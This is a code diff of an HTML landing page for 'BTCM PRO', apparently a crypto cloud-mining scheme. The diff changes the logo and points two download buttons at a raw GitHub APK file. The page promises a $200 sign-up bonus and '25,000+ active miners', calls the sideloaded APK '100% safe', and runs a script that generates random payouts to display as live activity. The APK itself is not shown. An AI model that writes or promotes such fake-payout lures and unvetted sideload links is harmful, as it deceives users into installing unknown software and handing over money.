@@ -75,7 +75,7 @@
         .logo-icon {
             width: 56px;
             height: 56px;
-            background: linear-gradient(135deg, #f7931a, #008cff, #9d00ff);
+            background: linear-gradient(135deg, #f7931a, #ffb347);
             border-radius: 20px;
             display: flex;
             align-items: center;
@@ -86,11 +86,9 @@
             padding: 8px;
         }
 
-        .logo-icon img {
+        .logo-icon svg {
             width: 100%;
             height: 100%;
-            object-fit: cover;
-            border-radius: 14px;
         }
 
         .logo-icon:hover {
@@ -547,14 +545,19 @@
     <div class="header">
         <div class="logo">
             <div class="logo-icon">
-                <img src="https://raw.githubusercontent.com/btcm-pro/btcm-pro/main/GeminiGeneratedImagedg32eidg32eidg32256x256.jpg" alt="BTCM PRO Logo">
+                <svg width="100%" height="100%" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <polygon points="25,35 42,35 34,20" fill="#0a0c1a"/>
+                    <polygon points="45,35 55,35 50,18" fill="#0a0c1a"/>
+                    <polygon points="58,35 75,35 66,20" fill="#0a0c1a"/>
+                    <polygon points="22,38 78,38 50,82" fill="#0a0c1a"/>
+                </svg>
             </div>
             <div class="logo-text">
                 <h1>BTCM PRO</h1>
                 <span>ADVANCED CLOUD MINING</span>
             </div>
         </div>
-        \<a href="https://github.com/btcm-pro/btcm-pro/raw/refs/heads/main/app-release.apk" class="download-header" download>
+        <a href="https://raw.githubusercontent.com/btcm-pro/btcm-pro/main/app-release.apk" class="download-header" download>
             <i class="fas fa-download"></i> DOWNLOAD APK
         </a>
     </div>
@@ -617,7 +620,7 @@
     <div id="downloadNow" class="cta-box">
         <h2>🚀 Start Mining Today</h2>
         <p style="margin-bottom: 25px;">Join 25,000+ active miners. Get $200 bonus on sign-up.</p>
-        \<a href="https://github.com/btcm-pro/btcm-pro/raw/refs/heads/main/app-release.apk" class="btn-primary" style="font-size: 20px; padding: 16px 48px;" download>
+        <a href="https://raw.githubusercontent.com/btcm-pro/btcm-pro/main/app-release.apk" class="btn-primary" style="font-size: 20px; padding: 16px 48px;" download>
             <i class="fas fa-download"></i> Download BTCM PRO (APK)
         </a>
         <p style="margin-top: 20px; font-size: 13px;">Direct APK — No ZIP, no extra files. 100% safe.</p>
@@ -763,7 +766,7 @@
         
         // initial seeding: show first payout after 1.8 sec, also generate several warmup
         setTimeout(() => {
-            generateRandomPayout(); // first one appears
+            generateRandomPayout();
         }, 1500);
         
         // after 3 seconds, add another to queue (so it will appear after first disappears)
